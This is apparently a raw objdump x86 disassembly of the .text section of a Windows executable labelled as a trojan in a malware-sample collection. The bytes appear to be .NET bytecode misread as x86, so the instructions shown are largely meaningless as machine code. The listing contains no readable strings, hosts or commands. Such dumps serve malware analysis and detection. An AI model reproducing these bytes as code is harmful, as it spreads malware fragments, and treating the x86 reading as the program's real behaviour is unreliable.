
malware_samples/trojan/e94c2520b761f43bec8bd9dfed688bbb7167d7e55f48d62c6772f28165912785.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	40                   	inc    %eax
  402001:	d1 00                	roll   $1,(%eax)
  402003:	00 00                	add    %al,(%eax)
  402005:	00 00                	add    %al,(%eax)
  402007:	00 48 00             	add    %cl,0x0(%eax)
  40200a:	00 00                	add    %al,(%eax)
  40200c:	02 00                	add    (%eax),%al
  40200e:	05 00 f4 59 00       	add    $0x59f400,%eax
  402013:	00 14 77             	add    %dl,(%edi,%esi,2)
  402016:	00 00                	add    %al,(%eax)
  402018:	03 00                	add    (%eax),%eax
  40201a:	00 00                	add    %al,(%eax)
  40201c:	01 00                	add    %eax,(%eax)
  40201e:	00 06                	add    %al,(%esi)
	...
  402050:	bf eb 1e 56 fb       	mov    $0xfb561eeb,%edi
  402055:	cd 97                	int    $0x97
  402057:	3b b2 19 02 24 30    	cmp    0x30240219(%edx),%esi
  40205d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40205e:	78 43                	js     0x4020a3
  402060:	00 3d 56 44 d2 1e    	add    %bh,0x1ed24456
  402066:	62 b9 d4 f1 80 e7    	bound  %edi,-0x187f0e2c(%ecx)
  40206c:	e6 c3                	out    %al,$0xc3
  40206e:	39 41 2e             	cmp    %eax,0x2e(%ecx)
  402071:	00 2f                	add    %ch,(%edi)
  402073:	00 5c 00 00          	add    %bl,0x0(%eax,%eax,1)
  402077:	00 1e                	add    %bl,(%esi)
  402079:	02 28                	add    (%eax),%ch
  40207b:	18 00                	sbb    %al,(%eax)
  40207d:	00 0a                	add    %cl,(%edx)
  40207f:	2a 1a                	sub    (%edx),%bl
  402081:	7e 13                	jle    0x402096
  402083:	00 00                	add    %al,(%eax)
  402085:	04 2a                	add    $0x2a,%al
  402087:	1e                   	push   %ds
  402088:	02 80 13 00 00 04    	add    0x4000013(%eax),%al
  40208e:	2a 1a                	sub    (%edx),%bl
  402090:	7e 14                	jle    0x4020a6
  402092:	00 00                	add    %al,(%eax)
  402094:	04 2a                	add    $0x2a,%al
  402096:	1e                   	push   %ds
  402097:	02 80 14 00 00 04    	add    0x4000014(%eax),%al
  40209d:	2a 1a                	sub    (%edx),%bl
  40209f:	7e 15                	jle    0x4020b6
  4020a1:	00 00                	add    %al,(%eax)
  4020a3:	04 2a                	add    $0x2a,%al
  4020a5:	1e                   	push   %ds
  4020a6:	02 80 15 00 00 04    	add    0x4000015(%eax),%al
  4020ac:	2a 1a                	sub    (%edx),%bl
  4020ae:	7e 16                	jle    0x4020c6
  4020b0:	00 00                	add    %al,(%eax)
  4020b2:	04 2a                	add    $0x2a,%al
  4020b4:	1e                   	push   %ds
  4020b5:	02 80 16 00 00 04    	add    0x4000016(%eax),%al
  4020bb:	2a 1a                	sub    (%edx),%bl
  4020bd:	7e 17                	jle    0x4020d6
  4020bf:	00 00                	add    %al,(%eax)
  4020c1:	04 2a                	add    $0x2a,%al
  4020c3:	1e                   	push   %ds
  4020c4:	02 80 17 00 00 04    	add    0x4000017(%eax),%al
  4020ca:	2a 1a                	sub    (%edx),%bl
  4020cc:	7e 18                	jle    0x4020e6
  4020ce:	00 00                	add    %al,(%eax)
  4020d0:	04 2a                	add    $0x2a,%al
  4020d2:	1e                   	push   %ds
  4020d3:	02 80 18 00 00 04    	add    0x4000018(%eax),%al
  4020d9:	2a 1a                	sub    (%edx),%bl
  4020db:	7e 19                	jle    0x4020f6
  4020dd:	00 00                	add    %al,(%eax)
  4020df:	04 2a                	add    $0x2a,%al
  4020e1:	1e                   	push   %ds
  4020e2:	02 80 19 00 00 04    	add    0x4000019(%eax),%al
  4020e8:	2a 1a                	sub    (%edx),%bl
  4020ea:	7e 1a                	jle    0x402106
  4020ec:	00 00                	add    %al,(%eax)
  4020ee:	04 2a                	add    $0x2a,%al
  4020f0:	1a 7e 1b             	sbb    0x1b(%esi),%bh
  4020f3:	00 00                	add    %al,(%eax)
  4020f5:	04 2a                	add    $0x2a,%al
  4020f7:	1e                   	push   %ds
  4020f8:	02 80 1b 00 00 04    	add    0x400001b(%eax),%al
  4020fe:	2a 1a                	sub    (%edx),%bl
  402100:	7e 1c                	jle    0x40211e
  402102:	00 00                	add    %al,(%eax)
  402104:	04 2a                	add    $0x2a,%al
  402106:	1e                   	push   %ds
  402107:	02 80 1c 00 00 04    	add    0x400001c(%eax),%al
  40210d:	2a 1a                	sub    (%edx),%bl
  40210f:	7e 1d                	jle    0x40212e
  402111:	00 00                	add    %al,(%eax)
  402113:	04 2a                	add    $0x2a,%al
  402115:	1e                   	push   %ds
  402116:	02 80 1d 00 00 04    	add    0x400001d(%eax),%al
  40211c:	2a 2a                	sub    (%edx),%ch
  40211e:	02 28                	add    (%eax),%ch
  402120:	3e 00 00             	add    %al,%ds:(%eax)
  402123:	0a 16                	or     (%esi),%dl
  402125:	fe 03                	incb   (%ebx)
  402127:	2a 32                	sub    (%edx),%dh
  402129:	7e 0b                	jle    0x402136
  40212b:	00 00                	add    %al,(%eax)
  40212d:	04 03                	add    $0x3,%al
  40212f:	6f                   	outsl  %ds:(%esi),(%dx)
  402130:	3f                   	aas
  402131:	00 00                	add    %al,(%eax)
  402133:	0a 2a                	or     (%edx),%ch
  402135:	2e 73 18             	jae,pn 0x402150
  402138:	00 00                	add    %al,(%eax)
  40213a:	0a 80 1a 00 00 04    	or     0x400001a(%eax),%al
  402140:	2a e6                	sub    %dh,%ah
  402142:	28 29                	sub    %ch,(%ecx)
  402144:	00 00                	add    %al,(%eax)
  402146:	06                   	push   %es
  402147:	3a 28                	cmp    (%eax),%ch
  402149:	00 00                	add    %al,(%eax)
  40214b:	00 28                	add    %ch,(%eax)
  40214d:	2a 00                	sub    (%eax),%al
  40214f:	00 06                	add    %al,(%esi)
  402151:	3a 1e                	cmp    (%esi),%bl
  402153:	00 00                	add    %al,(%eax)
  402155:	00 28                	add    %ch,(%eax)
  402157:	2b 00                	sub    (%eax),%eax
  402159:	00 06                	add    %al,(%esi)
  40215b:	3a 14 00             	cmp    (%eax,%eax,1),%dl
  40215e:	00 00                	add    %al,(%eax)
  402160:	28 27                	sub    %ah,(%edi)
  402162:	00 00                	add    %al,(%eax)
  402164:	06                   	push   %es
  402165:	3a 0a                	cmp    (%edx),%cl
  402167:	00 00                	add    %al,(%eax)
  402169:	00 28                	add    %ch,(%eax)
  40216b:	28 00                	sub    %al,(%eax)
  40216d:	00 06                	add    %al,(%esi)
  40216f:	39 06                	cmp    %eax,(%esi)
  402171:	00 00                	add    %al,(%eax)
  402173:	00 14 28             	add    %dl,(%eax,%ebp,1)
  402176:	76 00                	jbe    0x402178
  402178:	00 0a                	add    %cl,(%edx)
  40217a:	2a 56 28             	sub    0x28(%esi),%dl
  40217d:	9c                   	pushf
  40217e:	00 00                	add    %al,(%eax)
  402180:	0a 73 9d             	or     -0x63(%ebx),%dh
  402183:	00 00                	add    %al,(%eax)
  402185:	0a 20                	or     (%eax),%ah
  402187:	20 02                	and    %al,(%edx)
  402189:	00 00                	add    %al,(%eax)
  40218b:	6f                   	outsl  %ds:(%esi),(%dx)
  40218c:	9e                   	sahf
  40218d:	00 00                	add    %al,(%eax)
  40218f:	0a 2a                	or     (%edx),%ch
  402191:	6e                   	outsb  %ds:(%esi),(%dx)
  402192:	7e 1e                	jle    0x4021b2
  402194:	00 00                	add    %al,(%eax)
  402196:	04 39                	add    $0x39,%al
  402198:	10 00                	adc    %al,(%eax)
  40219a:	00 00                	add    %al,(%eax)
  40219c:	7e 1e                	jle    0x4021bc
  40219e:	00 00                	add    %al,(%eax)
  4021a0:	04 6f                	add    $0x6f,%al
  4021a2:	ad                   	lods   %ds:(%esi),%eax
  4021a3:	00 00                	add    %al,(%eax)
  4021a5:	0a 14 80             	or     (%eax,%eax,4),%dl
  4021a8:	1e                   	push   %ds
  4021a9:	00 00                	add    %al,(%eax)
  4021ab:	04 2a                	add    $0x2a,%al
  4021ad:	7e 7e                	jle    0x40222d
  4021af:	0f 00 00             	sldt   (%eax)
  4021b2:	04 28                	add    $0x28,%al
  4021b4:	17                   	pop    %ss
  4021b5:	00 00                	add    %al,(%eax)
  4021b7:	0a 39                	or     (%ecx),%bh
  4021b9:	0f 00 00             	sldt   (%eax)
  4021bc:	00 28                	add    %ch,(%eax)
  4021be:	30 00                	xor    %al,(%eax)
  4021c0:	00 06                	add    %al,(%esi)
  4021c2:	39 05 00 00 00 28    	cmp    %eax,0x28000000
  4021c8:	40                   	inc    %eax
  4021c9:	00 00                	add    %al,(%eax)
  4021cb:	06                   	push   %es
  4021cc:	2a 56 72             	sub    0x72(%esi),%dl
  4021cf:	56                   	push   %esi
  4021d0:	26 00 70 7e          	add    %dh,%es:0x7e(%eax)
  4021d4:	10 00                	adc    %al,(%eax)
  4021d6:	00 04 28             	add    %al,(%eax,%ebp,1)
  4021d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4021da:	00 00                	add    %al,(%eax)
  4021dc:	0a 80 23 00 00 04    	or     0x4000023(%eax),%al
  4021e2:	2a be 73 94 00 00    	sub    0x9473(%esi),%bh
  4021e8:	06                   	push   %es
  4021e9:	25 72 0a 22 00       	and    $0x220a72,%eax
  4021ee:	70 6f                	jo     0x40225f
  4021f0:	7f 00                	jg     0x4021f2
  4021f2:	00 06                	add    %al,(%esi)
  4021f4:	72 02                	jb     0x4021f8
  4021f6:	27                   	daa
  4021f7:	00 70 6f             	add    %dh,0x6f(%eax)
  4021fa:	8c 00                	mov    %es,(%eax)
  4021fc:	00 06                	add    %al,(%esi)
  4021fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4021ff:	89 00                	mov    %eax,(%eax)
  402201:	00 06                	add    %al,(%esi)
  402203:	28 20                	sub    %ah,(%eax)
  402205:	00 00                	add    %al,(%eax)
  402207:	06                   	push   %es
  402208:	20 e8                	and    %ch,%al
  40220a:	03 00                	add    (%eax),%eax
  40220c:	00 28                	add    %ch,(%eax)
  40220e:	14 00                	adc    $0x0,%al
  402210:	00 0a                	add    %cl,(%edx)
  402212:	2a da                	sub    %dl,%bl
  402214:	73 94                	jae    0x4021aa
  402216:	00 00                	add    %al,(%eax)
  402218:	06                   	push   %es
  402219:	25 72 0a 22 00       	and    $0x220a72,%eax
  40221e:	70 6f                	jo     0x40228f
  402220:	7f 00                	jg     0x402222
  402222:	00 06                	add    %al,(%esi)
  402224:	72 14                	jb     0x40223a
  402226:	27                   	daa
  402227:	00 70 6f             	add    %dh,0x6f(%eax)
  40222a:	8c 00                	mov    %es,(%eax)
  40222c:	00 06                	add    %al,(%esi)
  40222e:	25 72 14 27 00       	and    $0x271472,%eax
  402233:	70 6f                	jo     0x4022a4
  402235:	7f 00                	jg     0x402237
  402237:	00 06                	add    %al,(%esi)
  402239:	02 6f 8c             	add    -0x74(%edi),%ch
  40223c:	00 00                	add    %al,(%eax)
  40223e:	06                   	push   %es
  40223f:	6f                   	outsl  %ds:(%esi),(%dx)
  402240:	89 00                	mov    %eax,(%eax)
  402242:	00 06                	add    %al,(%esi)
  402244:	28 20                	sub    %ah,(%eax)
  402246:	00 00                	add    %al,(%eax)
  402248:	06                   	push   %es
  402249:	2a 2e                	sub    (%esi),%ch
  40224b:	73 c9                	jae    0x402216
  40224d:	00 00                	add    %al,(%eax)
  40224f:	0a 80 24 00 00 04    	or     0x4000024(%eax),%al
  402255:	2a 5e 02             	sub    0x2(%esi),%bl
  402258:	28 19                	sub    %bl,(%ecx)
  40225a:	00 00                	add    %al,(%eax)
  40225c:	0a 03                	or     (%ebx),%al
  40225e:	6f                   	outsl  %ds:(%esi),(%dx)
  40225f:	1f                   	pop    %ds
  402260:	00 00                	add    %al,(%eax)
  402262:	0a 28                	or     (%eax),%ch
  402264:	4d                   	dec    %ebp
  402265:	00 00                	add    %al,(%eax)
  402267:	06                   	push   %es
  402268:	28 ce                	sub    %cl,%dh
  40226a:	00 00                	add    %al,(%eax)
  40226c:	0a 2a                	or     (%edx),%ch
  40226e:	5e                   	pop    %esi
  40226f:	28 19                	sub    %bl,(%ecx)
  402271:	00 00                	add    %al,(%eax)
  402273:	0a 02                	or     (%edx),%al
  402275:	03 28                	add    (%eax),%ebp
  402277:	1a 00                	sbb    (%eax),%al
  402279:	00 0a                	add    %cl,(%edx)
  40227b:	28 4f 00             	sub    %cl,0x0(%edi)
  40227e:	00 06                	add    %al,(%esi)
  402280:	6f                   	outsl  %ds:(%esi),(%dx)
  402281:	1b 00                	sbb    (%eax),%eax
  402283:	00 0a                	add    %cl,(%edx)
  402285:	2a 62 1f             	sub    0x1f(%edx),%ah
  402288:	20 8d 44 00 00 01    	and    %cl,0x1000044(%ebp)
  40228e:	25 d0 2d 00 00       	and    $0x2dd0,%eax
  402293:	04 28                	add    $0x28,%al
  402295:	e4 00                	in     $0x0,%al
  402297:	00 0a                	add    %cl,(%edx)
  402299:	80 2c 00 00          	subb   $0x0,(%eax,%eax,1)
  40229d:	04 2a                	add    $0x2a,%al
  40229f:	32 7e 2e             	xor    0x2e(%esi),%bh
  4022a2:	00 00                	add    %al,(%eax)
  4022a4:	04 02                	add    $0x2,%al
  4022a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4022a7:	1f                   	pop    %ds
  4022a8:	00 00                	add    %al,(%eax)
  4022aa:	0a 2a                	or     (%edx),%ch
  4022ac:	32 7e 2e             	xor    0x2e(%esi),%bh
  4022af:	00 00                	add    %al,(%eax)
  4022b1:	04 02                	add    $0x2,%al
  4022b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4022b4:	1b 00                	sbb    (%eax),%eax
  4022b6:	00 0a                	add    %cl,(%edx)
  4022b8:	2a 32                	sub    (%edx),%dh
  4022ba:	02 28                	add    (%eax),%ch
  4022bc:	e7 00                	out    %eax,$0x0
  4022be:	00 0a                	add    %cl,(%edx)
  4022c0:	28 58 00             	sub    %bl,0x0(%eax)
  4022c3:	00 06                	add    %al,(%esi)
  4022c5:	2a 8e 1a 8d 44 00    	sub    0x448d1a(%esi),%cl
  4022cb:	00 01                	add    %al,(%ecx)
  4022cd:	25 19 02 d2 9c       	and    $0x9cd20219,%eax
  4022d2:	25 18 02 1e 63       	and    $0x631e0218,%eax
  4022d7:	d2 9c 25 17 02 1f 10 	rcrb   %cl,0x101f0217(%ebp,%eiz,1)
  4022de:	63 d2                	arpl   %edx,%edx
  4022e0:	9c                   	pushf
  4022e1:	25 16 02 1f 18       	and    $0x181f0216,%eax
  4022e6:	63 d2                	arpl   %edx,%edx
  4022e8:	9c                   	pushf
  4022e9:	2a 4e 18             	sub    0x18(%esi),%cl
  4022ec:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4022f0:	01 25 17 02 d2 9c    	add    %esp,0x9cd20217
  4022f6:	25 16 02 1e 63       	and    $0x631e0216,%eax
  4022fb:	d2 9c 2a 32 02 28 e8 	rcrb   %cl,-0x17d7fdce(%edx,%ebp,1)
  402302:	00 00                	add    %al,(%eax)
  402304:	0a 28                	or     (%eax),%ch
  402306:	58                   	pop    %eax
  402307:	00 00                	add    %al,(%eax)
  402309:	06                   	push   %es
  40230a:	2a 2e                	sub    (%esi),%ch
  40230c:	73 e9                	jae    0x4022f7
  40230e:	00 00                	add    %al,(%eax)
  402310:	0a 80 2e 00 00 04    	or     0x400002e(%eax),%al
  402316:	2a 56 02             	sub    0x2(%esi),%dl
  402319:	15 7d 30 00 00       	adc    $0x307d,%eax
  40231e:	04 02                	add    $0x2,%al
  402320:	28 18                	sub    %bl,(%eax)
  402322:	00 00                	add    %al,(%eax)
  402324:	0a 02                	or     (%edx),%al
  402326:	03 7d 2f             	add    0x2f(%ebp),%edi
  402329:	00 00                	add    %al,(%eax)
  40232b:	04 2a                	add    $0x2a,%al
  40232d:	4a                   	dec    %edx
  40232e:	02 7b 2f             	add    0x2f(%ebx),%bh
  402331:	00 00                	add    %al,(%eax)
  402333:	04 02                	add    $0x2,%al
  402335:	7b 30                	jnp    0x402367
  402337:	00 00                	add    %al,(%eax)
  402339:	04 6f                	add    $0x6f,%al
  40233b:	ea 00 00 0a 2a 8a 02 	ljmp   $0x28a,$0x2a0a0000
  402342:	02 7b 30             	add    0x30(%ebx),%bh
  402345:	00 00                	add    %al,(%eax)
  402347:	04 17                	add    $0x17,%al
  402349:	58                   	pop    %eax
  40234a:	7d 30                	jge    0x40237c
  40234c:	00 00                	add    %al,(%eax)
  40234e:	04 02                	add    $0x2,%al
  402350:	7b 30                	jnp    0x402382
  402352:	00 00                	add    %al,(%eax)
  402354:	04 02                	add    $0x2,%al
  402356:	7b 2f                	jnp    0x402387
  402358:	00 00                	add    %al,(%eax)
  40235a:	04 6f                	add    $0x6f,%al
  40235c:	eb 00                	jmp    0x40235e
  40235e:	00 0a                	add    %cl,(%edx)
  402360:	fe 04 2a             	incb   (%edx,%ebp,1)
  402363:	22 02                	and    (%edx),%al
  402365:	15 7d 30 00 00       	adc    $0x307d,%eax
  40236a:	04 2a                	add    $0x2a,%al
  40236c:	56                   	push   %esi
  40236d:	02 28                	add    (%eax),%ch
  40236f:	18 00                	sbb    %al,(%eax)
  402371:	00 0a                	add    %cl,(%edx)
  402373:	02 03                	add    (%ebx),%al
  402375:	7d 32                	jge    0x4023a9
  402377:	00 00                	add    %al,(%eax)
  402379:	04 02                	add    $0x2,%al
  40237b:	04 7d                	add    $0x7d,%al
  40237d:	31 00                	xor    %eax,(%eax)
  40237f:	00 04 2a             	add    %al,(%edx,%ebp,1)
  402382:	32 02                	xor    (%edx),%al
  402384:	7b 32                	jnp    0x4023b8
  402386:	00 00                	add    %al,(%eax)
  402388:	04 6f                	add    $0x6f,%al
  40238a:	71 00                	jno    0x40238c
  40238c:	00 06                	add    %al,(%esi)
  40238e:	2a 4e 02             	sub    0x2(%esi),%cl
  402391:	7b 32                	jnp    0x4023c5
  402393:	00 00                	add    %al,(%eax)
  402395:	04 6f                	add    $0x6f,%al
  402397:	71 00                	jno    0x402399
  402399:	00 06                	add    %al,(%esi)
  40239b:	25 03 6f 8c 00       	and    $0x8c6f03,%eax
  4023a0:	00 06                	add    %al,(%esi)
  4023a2:	2a 4e 02             	sub    0x2(%esi),%cl
  4023a5:	7b 32                	jnp    0x4023d9
  4023a7:	00 00                	add    %al,(%eax)
  4023a9:	04 6f                	add    $0x6f,%al
  4023ab:	71 00                	jno    0x4023ad
  4023ad:	00 06                	add    %al,(%esi)
  4023af:	25 03 6f 74 00       	and    $0x746f03,%eax
  4023b4:	00 06                	add    %al,(%esi)
  4023b6:	2a 4e 02             	sub    0x2(%esi),%cl
  4023b9:	7b 32                	jnp    0x4023ed
  4023bb:	00 00                	add    %al,(%eax)
  4023bd:	04 6f                	add    $0x6f,%al
  4023bf:	71 00                	jno    0x4023c1
  4023c1:	00 06                	add    %al,(%esi)
  4023c3:	25 03 6f 85 00       	and    $0x856f03,%eax
  4023c8:	00 06                	add    %al,(%esi)
  4023ca:	2a 36                	sub    (%esi),%dh
  4023cc:	02 7b 31             	add    0x31(%ebx),%bh
  4023cf:	00 00                	add    %al,(%eax)
  4023d1:	04 03                	add    $0x3,%al
  4023d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4023d4:	ea 00 00 0a 2a 32 02 	ljmp   $0x232,$0x2a0a0000
  4023db:	7b 31                	jnp    0x40240e
  4023dd:	00 00                	add    %al,(%eax)
  4023df:	04 6f                	add    $0x6f,%al
  4023e1:	eb 00                	jmp    0x4023e3
  4023e3:	00 0a                	add    %cl,(%edx)
  4023e5:	2a 66 02             	sub    0x2(%esi),%ah
  4023e8:	03 7d 33             	add    0x33(%ebp),%edi
  4023eb:	00 00                	add    %al,(%eax)
  4023ed:	04 02                	add    $0x2,%al
  4023ef:	02 7b 33             	add    0x33(%ebx),%bh
  4023f2:	00 00                	add    %al,(%eax)
  4023f4:	04 6f                	add    $0x6f,%al
  4023f6:	7d 00                	jge    0x4023f8
  4023f8:	00 0a                	add    %cl,(%edx)
  4023fa:	7d 34                	jge    0x402430
  4023fc:	00 00                	add    %al,(%eax)
  4023fe:	04 2a                	add    $0x2a,%al
  402400:	82 02 7b             	addb   $0x7b,(%edx)
  402403:	36 00 00             	add    %al,%ss:(%eax)
  402406:	04 18                	add    $0x18,%al
  402408:	3b 0d 00 00 00 02    	cmp    0x2000000,%ecx
  40240e:	28 6b 00             	sub    %ch,0x0(%ebx)
  402411:	00 06                	add    %al,(%esi)
  402413:	02 18                	add    (%eax),%bl
  402415:	7d 36                	jge    0x40244d
  402417:	00 00                	add    %al,(%eax)
  402419:	04 02                	add    $0x2,%al
  40241b:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  40241f:	06                   	push   %es
  402420:	2a 82 02 7b 36 00    	sub    0x367b02(%edx),%al
  402426:	00 04 19             	add    %al,(%ecx,%ebx,1)
  402429:	3b 0d 00 00 00 02    	cmp    0x2000000,%ecx
  40242f:	28 6b 00             	sub    %ch,0x0(%ebx)
  402432:	00 06                	add    %al,(%esi)
  402434:	02 19                	add    (%ecx),%bl
  402436:	7d 36                	jge    0x40246e
  402438:	00 00                	add    %al,(%eax)
  40243a:	04 02                	add    $0x2,%al
  40243c:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  402440:	06                   	push   %es
  402441:	2a 1e                	sub    (%esi),%bl
  402443:	02 28                	add    (%eax),%ch
  402445:	70 00                	jo     0x402447
  402447:	00 06                	add    %al,(%esi)
  402449:	2a 52 02             	sub    0x2(%edx),%dl
  40244c:	03 8c 68 00 00 01 7d 	add    0x7d010000(%eax,%ebp,2),%ecx
  402453:	35 00 00 04 02       	xor    $0x2040000,%eax
  402458:	1b 7d 36             	sbb    0x36(%ebp),%edi
  40245b:	00 00                	add    %al,(%eax)
  40245d:	04 2a                	add    $0x2a,%al
  40245f:	52                   	push   %edx
  402460:	02 03                	add    (%ebx),%al
  402462:	8c 95 00 00 01 7d    	mov    %ss,0x7d010000(%ebp)
  402468:	35 00 00 04 02       	xor    $0x2040000,%eax
  40246d:	1c 7d                	sbb    $0x7d,%al
  40246f:	36 00 00             	add    %al,%ss:(%eax)
  402472:	04 2a                	add    $0x2a,%al
  402474:	42                   	inc    %edx
  402475:	02 03                	add    (%ebx),%al
  402477:	7d 35                	jge    0x4024ae
  402479:	00 00                	add    %al,(%eax)
  40247b:	04 02                	add    $0x2,%al
  40247d:	1f                   	pop    %ds
  40247e:	0b 7d 36             	or     0x36(%ebp),%edi
  402481:	00 00                	add    %al,(%eax)
  402483:	04 2a                	add    $0x2a,%al
  402485:	52                   	push   %edx
  402486:	02 28                	add    (%eax),%ch
  402488:	70 00                	jo     0x40248a
  40248a:	00 06                	add    %al,(%esi)
  40248c:	25 03 7d 33 00       	and    $0x337d03,%eax
  402491:	00 04 04             	add    %al,(%esp,%eax,1)
  402494:	6f                   	outsl  %ds:(%esi),(%dx)
  402495:	81 00 00 06 2a 56    	addl   $0x562a0600,(%eax)
  40249b:	02 28                	add    (%eax),%ch
  40249d:	70 00                	jo     0x40249f
  40249f:	00 06                	add    %al,(%esi)
  4024a1:	25 03 7d 33 00       	and    $0x337d03,%eax
  4024a6:	00 04 04             	add    %al,(%esp,%eax,1)
  4024a9:	6a 6f                	push   $0x6f
  4024ab:	74 00                	je     0x4024ad
  4024ad:	00 06                	add    %al,(%esi)
  4024af:	2a 56 02             	sub    0x2(%esi),%dl
  4024b2:	28 6b 00             	sub    %ch,0x0(%ebx)
  4024b5:	00 06                	add    %al,(%esi)
  4024b7:	02 14 7d 35 00 00 04 	add    0x4000035(,%edi,2),%dl
  4024be:	02 17                	add    (%edi),%dl
  4024c0:	7d 36                	jge    0x4024f8
  4024c2:	00 00                	add    %al,(%eax)
  4024c4:	04 2a                	add    $0x2a,%al
  4024c6:	3e 02 03             	add    %ds:(%ebx),%al
  4024c9:	7d 35                	jge    0x402500
  4024cb:	00 00                	add    %al,(%eax)
  4024cd:	04 02                	add    $0x2,%al
  4024cf:	1a 7d 36             	sbb    0x36(%ebp),%bh
  4024d2:	00 00                	add    %al,(%eax)
  4024d4:	04 2a                	add    $0x2a,%al
  4024d6:	76 02                	jbe    0x4024da
  4024d8:	7b 35                	jnp    0x40250f
  4024da:	00 00                	add    %al,(%eax)
  4024dc:	04 3a                	add    $0x3a,%al
  4024de:	06                   	push   %es
  4024df:	00 00                	add    %al,(%eax)
  4024e1:	00 72 04             	add    %dh,0x4(%edx)
  4024e4:	22 00                	and    (%eax),%al
  4024e6:	70 2a                	jo     0x402512
  4024e8:	02 7b 35             	add    0x35(%ebx),%bh
  4024eb:	00 00                	add    %al,(%eax)
  4024ed:	04 6f                	add    $0x6f,%al
  4024ef:	38 00                	cmp    %al,(%eax)
  4024f1:	00 0a                	add    %cl,(%edx)
  4024f3:	2a 52 02             	sub    0x2(%edx),%dl
  4024f6:	1d 7d 36 00 00       	sbb    $0x367d,%eax
  4024fb:	04 02                	add    $0x2,%al
  4024fd:	03 8c 6c 00 00 01 7d 	add    0x7d010000(%esp,%ebp,2),%ecx
  402504:	35 00 00 04 2a       	xor    $0x2a040000,%eax
  402509:	56                   	push   %esi
  40250a:	02 1f                	add    (%edi),%bl
  40250c:	09 7d 36             	or     %edi,0x36(%ebp)
  40250f:	00 00                	add    %al,(%eax)
  402511:	04 02                	add    $0x2,%al
  402513:	03 8c 97 00 00 01 7d 	add    0x7d010000(%edi,%edx,4),%ecx
  40251a:	35 00 00 04 2a       	xor    $0x2a040000,%eax
  40251f:	52                   	push   %edx
  402520:	02 1e                	add    (%esi),%bl
  402522:	7d 36                	jge    0x40255a
  402524:	00 00                	add    %al,(%eax)
  402526:	04 02                	add    $0x2,%al
  402528:	03 8c 96 00 00 01 7d 	add    0x7d010000(%esi,%edx,4),%ecx
  40252f:	35 00 00 04 2a       	xor    $0x2a040000,%eax
  402534:	1e                   	push   %ds
  402535:	02 28                	add    (%eax),%ch
  402537:	82 00 00             	addb   $0x0,(%eax)
  40253a:	06                   	push   %es
  40253b:	2a 22                	sub    (%edx),%ah
  40253d:	02 03                	add    (%ebx),%al
  40253f:	28 81 00 00 06 2a    	sub    %al,0x2a060000(%ecx)
  402545:	1e                   	push   %ds
  402546:	02 28                	add    (%eax),%ch
  402548:	77 00                	ja     0x40254a
  40254a:	00 06                	add    %al,(%esi)
  40254c:	2a 22                	sub    (%edx),%ah
  40254e:	02 03                	add    (%ebx),%al
  402550:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  402554:	06                   	push   %es
  402555:	2a 1e                	sub    (%esi),%bl
  402557:	02 28                	add    (%eax),%ch
  402559:	78 00                	js     0x40255b
  40255b:	00 06                	add    %al,(%esi)
  40255d:	2a 22                	sub    (%edx),%ah
  40255f:	02 03                	add    (%ebx),%al
  402561:	28 85 00 00 06 2a    	sub    %al,0x2a060000(%ebp)
  402567:	1e                   	push   %ds
  402568:	02 7b 36             	add    0x36(%ebx),%bh
  40256b:	00 00                	add    %al,(%eax)
  40256d:	04 2a                	add    $0x2a,%al
  40256f:	32 02                	xor    (%edx),%al
  402571:	7b 38                	jnp    0x4025ab
  402573:	00 00                	add    %al,(%eax)
  402575:	04 73                	add    $0x73,%al
  402577:	5f                   	pop    %edi
  402578:	00 00                	add    %al,(%eax)
  40257a:	06                   	push   %es
  40257b:	2a 4a 02             	sub    0x2(%edx),%cl
  40257e:	73 c9                	jae    0x402549
  402580:	00 00                	add    %al,(%eax)
  402582:	0a 7d 38             	or     0x38(%ebp),%bh
  402585:	00 00                	add    %al,(%eax)
  402587:	04 02                	add    $0x2,%al
  402589:	28 18                	sub    %bl,(%eax)
  40258b:	00 00                	add    %al,(%eax)
  40258d:	0a 2a                	or     (%edx),%ch
  40258f:	3a 02                	cmp    (%edx),%al
  402591:	6f                   	outsl  %ds:(%esi),(%dx)
  402592:	00 01                	add    %al,(%ecx)
  402594:	00 0a                	add    %cl,(%edx)
  402596:	d2 02                	rolb   %cl,(%edx)
  402598:	28 97 00 00 06 2a    	sub    %dl,0x2a060000(%edi)
  40259e:	32 02                	xor    (%edx),%al
  4025a0:	20 c0                	and    %al,%al
  4025a2:	00 00                	add    %al,(%eax)
  4025a4:	00 6f ee             	add    %ch,-0x12(%edi)
  4025a7:	00 00                	add    %al,(%eax)
  4025a9:	0a 2a                	or     (%edx),%ch
  4025ab:	6a 02                	push   $0x2
  4025ad:	20 cb                	and    %cl,%bl
  4025af:	00 00                	add    %al,(%eax)
  4025b1:	00 6f ee             	add    %ch,-0x12(%edi)
  4025b4:	00 00                	add    %al,(%eax)
  4025b6:	0a 02                	or     (%edx),%al
  4025b8:	03 28                	add    (%eax),%ebp
  4025ba:	5c                   	pop    %esp
  4025bb:	00 00                	add    %al,(%eax)
  4025bd:	06                   	push   %es
  4025be:	16                   	push   %ss
  4025bf:	1e                   	push   %ds
  4025c0:	6f                   	outsl  %ds:(%esi),(%dx)
  4025c1:	4c                   	dec    %esp
  4025c2:	00 00                	add    %al,(%eax)
  4025c4:	0a 2a                	or     (%edx),%ch
  4025c6:	7e 02                	jle    0x4025ca
  4025c8:	20 ca                	and    %cl,%dl
  4025ca:	00 00                	add    %al,(%eax)
  4025cc:	00 6f ee             	add    %ch,-0x12(%edi)
  4025cf:	00 00                	add    %al,(%eax)
  4025d1:	0a 02                	or     (%edx),%al
  4025d3:	03 28                	add    (%eax),%ebp
  4025d5:	fd                   	std
  4025d6:	00 00                	add    %al,(%eax)
  4025d8:	0a 28                	or     (%eax),%ch
  4025da:	58                   	pop    %eax
  4025db:	00 00                	add    %al,(%eax)
  4025dd:	06                   	push   %es
  4025de:	16                   	push   %ss
  4025df:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  4025e2:	00 00                	add    %al,(%eax)
  4025e4:	0a 2a                	or     (%edx),%ch
